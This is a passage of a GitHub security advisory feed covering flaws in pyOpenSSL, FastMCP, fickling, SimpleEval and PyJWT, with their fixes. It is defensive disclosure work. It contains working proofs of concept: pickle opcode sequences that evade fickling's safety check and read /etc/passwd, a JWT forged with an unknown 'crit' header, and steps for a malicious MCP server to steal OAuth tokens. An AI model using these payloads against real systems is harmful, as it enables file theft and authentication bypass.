        <updated>2026-03-16T15:15:43.000Z</updated>
        <content type="html"><![CDATA[<p>If a user provided callback to <code>set_tlsext_servername_callback</code> raised an unhandled exception, this would result in a connection being accepted. If a user was relying on this callback for any security-sensitive behavior, this could allow bypassing it.</p>
<p>Unhandled exceptions now result in rejecting the connection.</p>
<p>Credit to <strong>Leury Castillo</strong> for reporting this issue.</p>
<h3 id="references">References</h3>
<ul>
<li><a href="https://github.com/pyca/pyopenssl/security/advisories/GHSA-vp96-hxj8-p424">https://github.com/pyca/pyopenssl/security/advisories/GHSA-vp96-hxj8-p424</a></li>
<li><a href="https://github.com/pyca/pyopenssl/commit/d41a814759a9fb49584ca8ab3f7295de49a85aa0">https://github.com/pyca/pyopenssl/commit/d41a814759a9fb49584ca8ab3f7295de49a85aa0</a></li>
<li><a href="https://github.com/pyca/pyopenssl/blob/358cbf29c4e364c59930e53a270116249581eaa3/CHANGELOG.rst#L27">https://github.com/pyca/pyopenssl/blob/358cbf29c4e364c59930e53a270116249581eaa3/CHANGELOG.rst#L27</a></li>
<li><a href="https://github.com/advisories/GHSA-vp96-hxj8-p424">https://github.com/advisories/GHSA-vp96-hxj8-p424</a></li>
</ul>
]]></content>
        <author>
            <name>GitHub</name>
            <email>GitHub@noreply.github.com</email>
            <uri>https://github.com/advisories/GHSA-vp96-hxj8-p424</uri>
        </author>
        <category label="severity" term="LOW"/>
        <published>2026-03-16T15:15:43.000Z</published>
    </entry>
    <entry>
        <title type="html"><![CDATA[[fastmcp] FastMCP OAuth Proxy token reuse across MCP servers]]></title>
        <id>https://github.com/advisories/GHSA-5h2m-4q8j-pqpj</id>
        <link href="https://github.com/advisories/GHSA-5h2m-4q8j-pqpj"/>
        <updated>2026-03-16T21:55:10.000Z</updated>
        <content type="html"><![CDATA[<p>While testing the OAuth Proxy implementation, it was noticed that the server does not properly respect the <code>resource</code> parameter submitted by the client in the authorization and token request. Instead of issuing the token explicitly for this MCP server, the token is issued for the <code>base_url</code> passed to the <code>OAuthProxy</code> during initialization. </p>
<p><strong>Affected File:</strong>
<em><a href="https://github.com/jlowin/fastmcp/blob/main/src/fastmcp/server/auth/oauth_proxy.py#L828">https://github.com/jlowin/fastmcp/blob/main/src/fastmcp/server/auth/oauth_proxy.py#L828</a></em></p>
<p><strong>Affected Code:</strong></p>
<pre><code class="language-python">self._jwt_issuer: JWTIssuer = JWTIssuer(
    issuer=str(self.base_url),
    audience=f"{str(self.base_url).rstrip('/')}/mcp",
    signing_key=jwt_signing_key,
)
</code></pre>
<p>Since the issued access and refresh tokens do not include information about the resource the token was issued for, it is impossible for the MCP server to properly verify whether the token was issued for it, hence violating the requirement of doing so demanded by the <a href="https://mcp.mintlify.app/specification/2025-11-25/basic/authorization#token-audience-binding-and-validation">specification</a>. Being able to verify whether the token was issued for the target MCP server enforces the protections offered by the steps proposed by the specification and the Resource Indicators OAuth extension.</p>
<p>Therefore, this misconfiguration exposes all MCP server setups using the FastMCP OAuth Proxy to an attack where an adversary creates a malicious MCP server that advertises the benign OAuth Proxy authorization server as its own authorization server. Once a victim completes an OAuth flow with this malicious MCP server, authenticating against the AS, the adversary can extract the token received at the malicious MCP server and use it to access other MCP servers (the benign ones) that also use the same AS, including the tools and resources they expose.</p>
<p><strong>Steps to reproduce:</strong></p>
<ol>
<li>Extract the provided <a href="https://github.com/user-attachments/files/23839983/improper_resource_validation_fastmcp.tgz">PoC environment</a>.</li>
<li>Enter the <em>client_id</em> and <em>client_secret</em> of a GitHub App you control into the <code>mcp-server-proxy.py</code> script.</li>
<li>Start the benign MCP server using an OAuth Proxy (in this case the <em>GitHubProvider</em>): <code>python3 mcp-server-proxy.py</code>.</li>
<li>Start the malicious AS: <code>python3 mal_auth_server.py</code>.</li>
<li>Start the malicious MCP server: <code>python3 attacker_server.py</code>.</li>
<li>Connect the client to the malicious MCP server: <code>python3 client.py</code>.</li>
<li>Complete the OAuth flow.</li>
<li>Observe in the logs of the malicious MCP server that the request to the benign MCP server with the stolen token returned a 200 status code.</li>
</ol>
<h2 id="impact">Impact</h2>
<p>This vulnerability allows an adversary to steal a victim’s authentication material for a benign MCP server using the FastMCP OAuth Proxy. The severity of this issue was decreased to <em>Medium</em> due to the consent screen showing the name of the MCP server the OAuth Proxy was intended for. However, a victim might not see it or get otherwise convinced by the attacker to ignore it, and overall this does not act as a proper mitigation for this issue.</p>
<h2 id="mitigation">Mitigation</h2>
<p>To mitigate this vulnerability, it is recommended to issue tokens specifically for the MCP server submitted in the authorization URL’s <code>resource</code> GET parameter. In this way, the receiving MCP server will be able to properly verify that the token was indeed issued for it, allowing it to reject tokens stolen by an attack like the one demonstrated above.</p>
<h3 id="references">References</h3>
<ul>
<li><a href="https://github.com/PrefectHQ/fastmcp/security/advisories/GHSA-5h2m-4q8j-pqpj">https://github.com/PrefectHQ/fastmcp/security/advisories/GHSA-5h2m-4q8j-pqpj</a></li>
<li><a href="https://nvd.nist.gov/vuln/detail/CVE-2025-69196">https://nvd.nist.gov/vuln/detail/CVE-2025-69196</a></li>
<li><a href="https://github.com/advisories/GHSA-5h2m-4q8j-pqpj">https://github.com/advisories/GHSA-5h2m-4q8j-pqpj</a></li>
</ul>
]]></content>
        <author>
            <name>GitHub</name>
            <email>GitHub@noreply.github.com</email>
            <uri>https://github.com/advisories/GHSA-5h2m-4q8j-pqpj</uri>
        </author>
        <category label="severity" term="HIGH"/>
        <published>2026-03-16T15:14:55.000Z</published>
    </entry>
    <entry>
        <title type="html"><![CDATA[[fickling] fickling's `platform` module subprocess invocation evades `check_safety()` with `LIKELY_SAFE`]]></title>
        <id>https://github.com/advisories/GHSA-5cxw-w2xg-2m8h</id>
        <link href="https://github.com/advisories/GHSA-5cxw-w2xg-2m8h"/>
        <updated>2026-03-13T20:58:11.000Z</updated>
        <content type="html"><![CDATA[<h1 id="our-assessment">Our assessment</h1>
<p>We added <code>platform</code> to the blocklist of unsafe modules (<a href="https://github.com/trailofbits/fickling/commit/351ed4d4242b447c0ffd550bb66b40695f3f9975">https://github.com/trailofbits/fickling/commit/351ed4d4242b447c0ffd550bb66b40695f3f9975</a>). </p>
<p>It was not possible to inject extra arguments to <code>file</code> without first monkey-patching <code>platform._follow_symlinks</code> with the pickle, as it always returns an absolute path. We independently hardened it with <a href="https://github.com/trailofbits/fickling/commit/b9e690c5a57ee9cd341de947fc6151959f4ae359">https://github.com/trailofbits/fickling/commit/b9e690c5a57ee9cd341de947fc6151959f4ae359</a> to reduce the risk of obtaining direct module references while evading detection.</p>
<p><a href="https://github.com/python/cpython/blob/6d1e9ceed3e70ebc39953f5ad4f20702ffa32119/Lib/platform.py#L687-L695">https://github.com/python/cpython/blob/6d1e9ceed3e70ebc39953f5ad4f20702ffa32119/Lib/platform.py#L687-L695</a></p>
<pre><code class="language-python">target = _follow_symlinks(target)
# "file" output is locale dependent: force the usage of the C locale
# to get deterministic behavior.
env = dict(os.environ, LC_ALL='C')
try:
    # -b: do not prepend filenames to output lines (brief mode)
    output = subprocess.check_output(['file', '-b', target],
                                     stderr=subprocess.DEVNULL,
                                     env=env)
</code></pre>
<h1 id="original-report">Original report</h1>
<h2 id="summary">Summary</h2>
<p>A crafted pickle invoking <code>platform._syscmd_file</code>, <code>platform.architecture</code>, or <code>platform.libc_ver</code> passes <code>check_safety()</code> with <code>Severity.LIKELY_SAFE</code> and zero findings. During <code>fickling.loads()</code>, these functions invoke <code>subprocess.check_output</code> with attacker-controlled arguments or read arbitrary files from disk.</p>
<p><strong>Clarification:</strong> The subprocess call uses a list argument (<code>['file', '-b', target]</code>), not <code>shell=True</code>, so the attacker controls the file path argument to the <code>file</code> command, not the command itself. The impact is subprocess invocation with attacker-controlled arguments and information disclosure (file type probing), not arbitrary command injection.</p>
<h2 id="affected-versions">Affected versions</h2>
<p><code>&lt;= 0.1.9</code> (verified on upstream HEAD as of 2026-03-04)</p>
<h2 id="non-duplication-check-against-published-fickling-ghsas">Non-duplication check against published Fickling GHSAs</h2>
<p>No published advisory covers <code>platform</code> module false-negative bypass. This follows the same structural pattern as GHSA-5hwf-rc88-82xm (missing modules in <code>UNSAFE_IMPORTS</code>) but covers a distinct set of functions.</p>
<h2 id="root-cause">Root cause</h2>
<ol>
<li><code>platform</code> not in <code>UNSAFE_IMPORTS</code> denylist.</li>
<li><code>OvertlyBadEvals</code> skips calls imported from stdlib modules.</li>
<li><code>UnusedVariables</code> heuristic neutralized by making call result appear used (<code>SETITEMS</code> path).</li>
</ol>
<h2 id="reproduction-clean-upstream">Reproduction (clean upstream)</h2>
<pre><code class="language-python">from unittest.mock import patch
import fickling
import fickling.fickle as op
from fickling.fickle import Pickled
from fickling.analysis import check_safety

pickled = Pickled([
    op.Proto.create(4),
    op.ShortBinUnicode('platform'),
    op.ShortBinUnicode('_syscmd_file'),
    op.StackGlobal(),
    op.ShortBinUnicode('/etc/passwd'),
    op.TupleOne(),
    op.Reduce(),
    op.Memoize(),
    op.EmptyDict(),
    op.ShortBinUnicode('init'),
    op.ShortBinUnicode('x'),
    op.SetItem(),
    op.Mark(),
    op.ShortBinUnicode('trace'),
    op.BinGet(0),
    op.SetItems(),
    op.Stop(),
])

results = check_safety(pickled)
print(results.severity.name, len(results.results))  # LIKELY_SAFE 0

with patch('subprocess.check_output', return_value=b'ASCII text') as mock_sub:
    fickling.loads(pickled.dumps())
    print('subprocess called?', mock_sub.called)       # True
    print('args:', mock_sub.call_args[0])               # (['file', '-b', '/etc/passwd'],)
</code></pre>
<p>Additional affected functions (same pattern):</p>
<ul>
<li><code>platform.architecture('/etc/passwd')</code> — calls <code>_syscmd_file</code> internally</li>
<li><code>platform.libc_ver('/etc/passwd')</code> — opens and reads arbitrary file contents</li>
</ul>
<h2 id="minimal-patch-diff">Minimal patch diff</h2>
<pre><code class="language-diff">--- a/fickling/fickle.py
+++ b/fickling/fickle.py
@@
+        "platform",
</code></pre>
<h2 id="validation-after-patch">Validation after patch</h2>
<ul>
<li>Same PoC flips to <code>LIKELY_OVERTLY_MALICIOUS</code></li>
<li><code>fickling.loads</code> raises <code>UnsafeFileError</code></li>
<li><code>subprocess.check_output</code> is not called</li>
</ul>
<h2 id="impact">Impact</h2>
<ul>
<li><strong>False-negative verdict:</strong> <code>check_safety()</code> returns <code>LIKELY_SAFE</code> with zero findings for a pickle that invokes a subprocess with attacker-controlled arguments.</li>
<li><strong>Subprocess invocation:</strong> <code>platform._syscmd_file</code> calls <code>subprocess.check_output(['file', '-b', target])</code> where <code>target</code> is attacker-controlled. The <code>file</code> command reads file headers and returns type information, enabling file existence and type probing.</li>
<li><strong>File read:</strong> <code>platform.libc_ver</code> opens and reads chunks of an attacker-specified file path.</li>
</ul>
<h3 id="references">References</h3>
<ul>
<li><a href="https://github.com/trailofbits/fickling/security/advisories/GHSA-5cxw-w2xg-2m8h">https://github.com/trailofbits/fickling/security/advisories/GHSA-5cxw-w2xg-2m8h</a></li>
<li><a href="https://github.com/trailofbits/fickling/commit/351ed4d4242b447c0ffd550bb66b40695f3f9975">https://github.com/trailofbits/fickling/commit/351ed4d4242b447c0ffd550bb66b40695f3f9975</a></li>
<li><a href="https://github.com/trailofbits/fickling/releases/tag/v0.1.10">https://github.com/trailofbits/fickling/releases/tag/v0.1.10</a></li>
<li><a href="https://github.com/advisories/GHSA-5cxw-w2xg-2m8h">https://github.com/advisories/GHSA-5cxw-w2xg-2m8h</a></li>
</ul>
]]></content>
        <author>
            <name>GitHub</name>
            <email>GitHub@noreply.github.com</email>
            <uri>https://github.com/advisories/GHSA-5cxw-w2xg-2m8h</uri>
        </author>
        <category label="severity" term="MODERATE"/>
        <published>2026-03-13T20:58:10.000Z</published>
    </entry>
    <entry>
        <title type="html"><![CDATA[[fickling] fickling modules linecache, difflib and gc are missing from the unsafe modules blocklist]]></title>
        <id>https://github.com/advisories/GHSA-r48f-3986-4f9c</id>
        <link href="https://github.com/advisories/GHSA-r48f-3986-4f9c"/>
        <updated>2026-03-13T20:57:41.000Z</updated>
        <content type="html"><![CDATA[<h1 id="our-analysis">Our analysis</h1>
<p>As stated in the <a href="https://github.com/trailofbits/fickling/security/policy">project's security policy</a>, we also don't consider <code>UnusedVariables</code> bypasses to be security issues. We added several unsafe modules mentioned by the reporter in advisory comments to the blocklist (<a href="https://github.com/trailofbits/fickling/commit/7f39d97258217ee2c21a1f5031d4a6d7343eb30d">https://github.com/trailofbits/fickling/commit/7f39d97258217ee2c21a1f5031d4a6d7343eb30d</a>). </p>
<h1 id="original-report">Original report</h1>
<p>Title: UnusedVariables analysis bypass via BUILD opcode Arbitrary File Read through fickling.load()</p>
<h3 id="summary">Summary</h3>
<p>Two independent bugs in fickling's AST-based static analysis combine to allow a malicious pickle file to execute arbitrary stdlib function calls - including reading sensitive files - while check_safety() returns Severity.LIKELY_SAFE and fickling.load() completes without raising UnsafeFileError.</p>
<p>A server using fickling.load() as a security gate before deserializing untrusted pickle data (its documented use case) is fully bypassed. The attacker receives the contents of any file readable by the server process as the return value of fickling.load().</p>
<h3 id="details">Details</h3>
<p>Interpreter.unused_assignments() does not scan the result assignment's RHS</p>
<p>File: fickling/fickle.py, Interpreter.unused_assignments(), ~line 1242</p>
<pre><code class="language-python">for statement in self.module_body:
    if isinstance(statement, ast.Assign):
        if (
            len(statement.targets) == 1
            and isinstance(statement.targets[0], ast.Name)
            and statement.targets[0].id == "result"
        ):
            break
        ...
        statement = statement.value
    if statement is not None:
        for node in ast.walk(statement):
            if isinstance(node, ast.Name):
                used.add(node.id)
</code></pre>
<p>When the loop reaches result = _varN, it breaks immediately. The right-hand side of the result assignment is never walked for variable references. Any variable whose only reference is inside the result expression is therefore never added to the used set and is incorrectly flagged as unused - unless it also appears in an earlier non-assignment statement.</p>
<p>The BUILD opcode generates exactly such a non-assignment statement:</p>
<pre><code class="language-python"># Build.run() generates:
_var4 = _var3                     # Assign  - _var3 added to used
_var4.__setstate__(_var2)         # Expr    - _var2 and _var4 added to used
</code></pre>
<p>This makes _var2 (the result of the dangerous call) appear in the used set via the <strong>setstate</strong> expression, so UnusedVariables never flags it.</p>
<p>File: fickling/fickle.py, TupleThree.run(), and siblings</p>
<pre><code class="language-python">def run(self, interpreter: Interpreter):
    top = interpreter.stack.pop()
    mid = interpreter.stack.pop()
    bot = interpreter.stack.pop()
    interpreter.stack.append(ast.Tuple((bot, mid, top), ast.Load()))
    #                                   ^^^^^^^^^^^^^^^^
    #                                   Python tuple, not list
</code></pre>
<p>Python's ast module requires repeated fields (such as Tuple.elts) to be lists. When elts is a Python tuple, ast.iter_child_nodes() does not yield its elements, so ast.walk() never descends into them. Any variable reference stored inside such a tuple node is invisible to every analysis that uses ast.walk() - including UnusedVariables.</p>
<p>Demo:</p>
<pre><code class="language-python">import ast
name = ast.Name(id='_var1', ctx=ast.Load())

# Correct (list elts) - ast.walk finds it
t = ast.Tuple(elts=[name], ctx=ast.Load())
print([n.id for n in ast.walk(t) if isinstance(n, ast.Name)])  # ['_var1']

# Buggy (tuple elts) - ast.walk finds nothing
t = ast.Tuple(elts=(name,), ctx=ast.Load())
print([n.id for n in ast.walk(t) if isinstance(n, ast.Name)])  # []
</code></pre>
<h4 id="combined-attack---arbitrary-file-read">Combined attack - arbitrary file read</h4>
<p>The two bugs combine with the absence of <code>linecache</code> and <code>difflib</code> from <code>UNSAFE_IMPORTS</code>:</p>
<pre><code>from linecache import getlines      # not in UNSAFE_IMPORTS
_var0 = getlines('/etc/passwd')     # reads the file
from builtins import enumerate
_var1 = enumerate(_var0)            # _var0 in RHS - added to used
from builtins import dict
_var2 = dict(_var1)                 # _var1 in RHS - added to used; produces {0:'line1',...}
from difflib import Differ
_var3 = Differ()                    # stdlib, not in UNSAFE_IMPORTS
_var4 = _var3
_var4.__setstate__(_var2)           # BUILD Expr - _var2 and _var4 added to used
result = _var3                      # loop breaks here; nothing in defined−used
</code></pre>
<p>check_safety() returns Severity.LIKELY_SAFE. fickling.load() calls pickle.loads(). At runtime, Differ().<strong>dict</strong>.update({0: 'root:x:0:0\n', ...}) succeeds and the file contents are returned to the caller.</p>
<h3 id="poc">PoC</h3>
<p><code>pip install fickling</code></p>
<pre><code class="language-python">#!/usr/bin/env python3
import io
import sys

import fickling.fickle as op
from fickling.fickle import Pickled
from fickling.analysis import check_safety, Severity
from fickling.loader import load
from fickling.exception import UnsafeFileError

TARGET = "/etc/passwd"

pickled = Pickled([
    op.Proto.create(4),

    op.ShortBinUnicode("linecache"),
    op.ShortBinUnicode("getlines"),
    op.StackGlobal(),
    op.ShortBinUnicode(TARGET),
    op.TupleOne(),
    op.Reduce(),
    op.Memoize(),                   # memo[0] = _var0 = getlines(TARGET)

    op.Global("builtins enumerate"),
    op.BinGet(0),
    op.TupleOne(),
    op.Reduce(),
    op.Memoize(),                   # memo[1] = _var1 = enumerate(_var0)

    op.Global("builtins dict"),
    op.BinGet(1),
    op.TupleOne(),
    op.Reduce(),
    op.Memoize(),                   # memo[2] = _var2 = dict(_var1)

    op.ShortBinUnicode("difflib"),
    op.ShortBinUnicode("Differ"),
    op.StackGlobal(),
    op.EmptyTuple(),
    op.Reduce(),
    op.Memoize(),                   # memo[3] = _var3 = Differ()

    op.BinGet(2),                   # push _var2 as BUILD state
    op.Build(),                     # _var4=_var3; _var4.__setstate__(_var2)

    op.BinGet(3),
    op.Stop(),
])

result = check_safety(pickled)
assert result.severity == Severity.LIKELY_SAFE, f"Expected LIKELY_SAFE, got {result.severity}"
print(f"[+] check_safety verdict : {result.severity.name}  (bypass confirmed)")

buf = io.BytesIO()
pickled.dump(buf)

obj = load(io.BytesIO(buf.getvalue()))
lines = {k: v for k, v in obj.__dict__.items() if isinstance(k, int)}

print(f"[+] fickling.load() returned : {type(obj).__name__}")
print(f"[+] {TARGET} - {len(lines)} lines exfiltrated:\n")
for i in sorted(lines):
    print(f"{lines[i]}", end="")
</code></pre>
<h3 id="result">Result</h3>
<pre><code>[+] check_safety verdict : LIKELY_SAFE  (bypass confirmed)
[+] fickling.load() returned : Differ
[+] /etc/passwd - 58 lines exfiltrated:

    root:x:0:0:root:/root:/usr/bin/zsh
    daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin
    bin:x:2:2:bin:/bin:/usr/sbin/nologin
    sys:x:3:3:sys:/dev:/usr/sbin/nologin
    sync:x:4:65534:sync:/bin:/bin/sync
    games:x:5:60:games:/usr/games:/usr/sbin/nologin
    man:x:6:12:man:/var/cache/man:/usr/sbin/nologin
    lp:x:7:7:lp:/var/spool/lpd:/usr/sbin/nologin
    mail:x:8:8:mail:/var/mail:/usr/sbin/nologin
    news:x:9:9:news:/var/spool/news:/usr/sbin/nologin
    uucp:x:10:10:uucp:/var/spool/uucp:/usr/sbin/nologin
    proxy:x:13:13:proxy:/bin:/usr/sbin/nologin
    www-data:x:33:33:www-data:/var/www:/usr/sbin/nologin
    backup:x:34:34:backup:/var/backups:/usr/sbin/nologin
    list:x:38:38:Mailing List Manager:/var/list:/usr/sbin/nologin
    irc:x:39:39:ircd:/run/ircd:/usr/sbin/nologin
    _apt:x:42:65534::/nonexistent:/usr/sbin/nologin
    nobody:x:65534:65534:nobody:/nonexistent:/usr/sbin/nologin
    systemd-network:x:998:998:systemd Network Management:/:/usr/sbin/nologin
    dhcpcd:x:100:65534:DHCP Client Daemon,,,:/usr/lib/dhcpcd:/bin/false
    systemd-timesync:x:992:992:systemd Time Synchronization:/:/usr/sbin/nologin
</code></pre>
<h3 id="impact">Impact</h3>
<p>Vulnerability type: Static analysis bypass leading to arbitrary file read (and arbitrary stdlib code execution) through a security-gated deserialization API.</p>
<p>Who is impacted: Any application or service that calls fickling.load() or fickling.loads() to validate untrusted pickle data before deserializing it. This is the primary documented use case of the fickling.loader module. The attacker supplies a pickle file; the server processes it through fickling.load(), receives LIKELY_SAFE, and unpickles the payload. File contents are returned directly in the deserialized object's attributes.</p>
<p>Beyond file read, the same BUILD-opcode technique can be applied to any stdlib module absent from UNSAFE_IMPORTS (e.g., gc.get_objects() for full in-process memory inspection, inspect.stack() for call-frame local variable exfiltration, netrc.netrc() for credential theft).</p>
<h3 id="references">References</h3>
<ul>
<li><a href="https://github.com/trailofbits/fickling/security/advisories/GHSA-r48f-3986-4f9c">https://github.com/trailofbits/fickling/security/advisories/GHSA-r48f-3986-4f9c</a></li>
<li><a href="https://github.com/trailofbits/fickling/commit/7f39d97258217ee2c21a1f5031d4a6d7343eb30d">https://github.com/trailofbits/fickling/commit/7f39d97258217ee2c21a1f5031d4a6d7343eb30d</a></li>
<li><a href="https://github.com/trailofbits/fickling/releases/tag/v0.1.10">https://github.com/trailofbits/fickling/releases/tag/v0.1.10</a></li>
<li><a href="https://github.com/advisories/GHSA-r48f-3986-4f9c">https://github.com/advisories/GHSA-r48f-3986-4f9c</a></li>
</ul>
]]></content>
        <author>
            <name>GitHub</name>
            <email>GitHub@noreply.github.com</email>
            <uri>https://github.com/advisories/GHSA-r48f-3986-4f9c</uri>
        </author>
        <category label="severity" term="MODERATE"/>
        <published>2026-03-13T20:57:40.000Z</published>
    </entry>
    <entry>
        <title type="html"><![CDATA[[simpleeval] SimpleEval: Objects (including modules) can leak dangerous modules through to direct access inside the sandbox]]></title>
        <id>https://github.com/advisories/GHSA-44vg-5wv2-h2hg</id>
        <link href="https://github.com/advisories/GHSA-44vg-5wv2-h2hg"/>
        <updated>2026-03-16T22:00:16.000Z</updated>
        <content type="html"><![CDATA[<h3 id="impact">Impact</h3>
<p>If the objects passed in as <code>names</code> to SimpleEval have modules or other disallowed / dangerous objects available as attrs.
Additionally, dangerous functions or modules could be accessed by passing them as callbacks to other safe functions to call.</p>
<p>Examples (found by @ByamB4):</p>
<p>Any module where non-underscore attribute chains reach os or sys:</p>
<ul>
<li>os.path, pathlib, shutil, glob (direct .os / .sys attributes)</li>
<li>statistics (has .sys)</li>
<li>numpy (has .ctypeslib.os and .f2py.sys)</li>
<li>urllib.parse (has .warnings.sys)</li>
</ul>
<h3 id="patches">Patches</h3>
<p>The latest version 1.0.5 has this issue fixed.</p>
<h3 id="workarounds">Workarounds</h3>
<p>Don't pass in objects or modules which have direct attributes to potentially dangerous items.
Use a wrapper to wrap the potentially vulnerable items (See the ModuleWrapper in version 1.0.5)</p>
<h3 id="references">References</h3>
<ul>
<li><a href="https://github.com/danthedeckie/simpleeval/security/advisories/GHSA-44vg-5wv2-h2hg">https://github.com/danthedeckie/simpleeval/security/advisories/GHSA-44vg-5wv2-h2hg</a></li>
<li><a href="https://github.com/danthedeckie/simpleeval/releases/tag/1.0.5">https://github.com/danthedeckie/simpleeval/releases/tag/1.0.5</a></li>
<li><a href="https://nvd.nist.gov/vuln/detail/CVE-2026-32640">https://nvd.nist.gov/vuln/detail/CVE-2026-32640</a></li>
<li><a href="https://github.com/advisories/GHSA-44vg-5wv2-h2hg">https://github.com/advisories/GHSA-44vg-5wv2-h2hg</a></li>
</ul>
]]></content>
        <author>
            <name>GitHub</name>
            <email>GitHub@noreply.github.com</email>
            <uri>https://github.com/advisories/GHSA-44vg-5wv2-h2hg</uri>
        </author>
        <category label="severity" term="HIGH"/>
        <published>2026-03-13T20:56:26.000Z</published>
    </entry>
    <entry>
        <title type="html"><![CDATA[[PyJWT] PyJWT accepts unknown `crit` header extensions]]></title>
        <id>https://github.com/advisories/GHSA-752w-5fwx-jx9f</id>
        <link href="https://github.com/advisories/GHSA-752w-5fwx-jx9f"/>
        <updated>2026-03-16T17:07:34.000Z</updated>
        <content type="html"><![CDATA[<h2 id="summary">Summary</h2>
<p>PyJWT does not validate the <code>crit</code> (Critical) Header Parameter defined in
RFC 7515 §4.1.11. When a JWS token contains a <code>crit</code> array listing
extensions that PyJWT does not understand, the library accepts the token
instead of rejecting it. This violates the <strong>MUST</strong> requirement in the RFC.</p>
<p>This is the same class of vulnerability as CVE-2025-59420 (Authlib),
which received CVSS 7.5 (HIGH).</p>
<hr>
<h2 id="rfc-requirement">RFC Requirement</h2>
<p>RFC 7515 §4.1.11:</p>
<blockquote>
<p>The "crit" (Critical) Header Parameter indicates that extensions to this
specification and/or [JWA] are being used that <strong>MUST</strong> be understood and
processed. [...] If any of the listed extension Header Parameters are
<strong>not understood and supported</strong> by the recipient, then the <strong>JWS is invalid</strong>.</p>
</blockquote>
<hr>
<h2 id="proof-of-concept">Proof of Concept</h2>
<pre><code class="language-python">import jwt  # PyJWT 2.8.0
import hmac, hashlib, base64, json

# Construct token with unknown critical extension
header = {"alg": "HS256", "crit": ["x-custom-policy"], "x-custom-policy": "require-mfa"}
payload = {"sub": "attacker", "role": "admin"}

def b64url(data):
    return base64.urlsafe_b64encode(data).rstrip(b"=").decode()

h = b64url(json.dumps(header, separators=(",", ":")).encode())
p = b64url(json.dumps(payload, separators=(",", ":")).encode())
sig = b64url(hmac.new(b"secret", f"{h}.{p}".encode(), hashlib.sha256).digest())
token = f"{h}.{p}.{sig}"

# Should REJECT — x-custom-policy is not understood by PyJWT
try:
    result = jwt.decode(token, "secret", algorithms=["HS256"])
    print(f"ACCEPTED: {result}")
    # Output: ACCEPTED: {'sub': 'attacker', 'role': 'admin'}
except Exception as e:
    print(f"REJECTED: {e}")
</code></pre>
<p><strong>Expected:</strong> <code>jwt.exceptions.InvalidTokenError: Unsupported critical extension: x-custom-policy</code>
<strong>Actual:</strong> Token accepted, payload returned.</p>
<h3 id="comparison-with-rfc-compliant-library">Comparison with RFC-compliant library</h3>
<pre><code class="language-python"># jwcrypto — correctly rejects
from jwcrypto import jwt as jw_jwt, jwk
key = jwk.JWK(kty="oct", k=b64url(b"secret"))
jw_jwt.JWT(jwt=token, key=key, algs=["HS256"])
# raises: InvalidJWSObject('Unknown critical header: "x-custom-policy"')
</code></pre>
<hr>
<h2 id="impact">Impact</h2>
<ul>
<li><strong>Split-brain verification</strong> in mixed-library deployments (e.g., API
gateway using jwcrypto rejects, backend using PyJWT accepts)</li>
<li><strong>Security policy bypass</strong> when <code>crit</code> carries enforcement semantics
(MFA, token binding, scope restrictions)</li>
<li><strong>Token binding bypass</strong> — RFC 7800 <code>cnf</code> (Proof-of-Possession) can be
silently ignored</li>
<li>See CVE-2025-59420 for full impact analysis</li>
</ul>
<hr>
<h2 id="suggested-fix">Suggested Fix</h2>
<p>In <code>jwt/api_jwt.py</code>, add validation in <code>_validate_headers()</code> or
<code>decode()</code>:</p>
<pre><code class="language-python">_SUPPORTED_CRIT = {"b64"}  # Add extensions PyJWT actually supports

def _validate_crit(self, headers: dict) -&gt; None:
    crit = headers.get("crit")
    if crit is None:
        return
    if not isinstance(crit, list) or len(crit) == 0:
        raise InvalidTokenError("crit must be a non-empty array")
    for ext in crit:
        if ext not in self._SUPPORTED_CRIT:
            raise InvalidTokenError(f"Unsupported critical extension: {ext}")
        if ext not in headers:
            raise InvalidTokenError(f"Critical extension {ext} not in header")
</code></pre>
<hr>
<h2 id="cwe">CWE</h2>
<ul>
<li>CWE-345: Insufficient Verification of Data Authenticity</li>
<li>CWE-863: Incorrect Authorization</li>
</ul>
<h2 id="references">References</h2>
<ul>
<li><a href="https://www.rfc-editor.org/rfc/rfc7515.html#section-4.1.11">RFC 7515 §4.1.11</a></li>
<li><a href="https://osv.dev/vulnerability/GHSA-9ggr-2464-2j32">CVE-2025-59420 — Authlib crit bypass (CVSS 7.5)</a></li>
<li><a href="https://www.rfc-editor.org/rfc/rfc7800">RFC 7800 — Proof-of-Possession Key Semantics</a></li>
</ul>
<h3 id="references-1">References</h3>
<ul>
<li><a href="https://github.com/jpadilla/pyjwt/security/advisories/GHSA-752w-5fwx-jx9f">https://github.com/jpadilla/pyjwt/security/advisories/GHSA-752w-5fwx-jx9f</a></li>
<li><a href="https://nvd.nist.gov/vuln/detail/CVE-2026-32597">https://nvd.nist.gov/vuln/detail/CVE-2026-32597</a></li>
<li><a href="https://github.com/advisories/GHSA-752w-5fwx-jx9f">https://github.com/advisories/GHSA-752w-5fwx-jx9f</a></li>
</ul>
]]></content>
        <author>
            <name>GitHub</name>
            <email>GitHub@noreply.github.com</email>
            <uri>https://github.com/advisories/GHSA-752w-5fwx-jx9f</uri>
        </author>
        <category label="severity" term="HIGH"/>
        <published>2026-03-13T20:05:04.000Z</published>
    </entry>
</feed>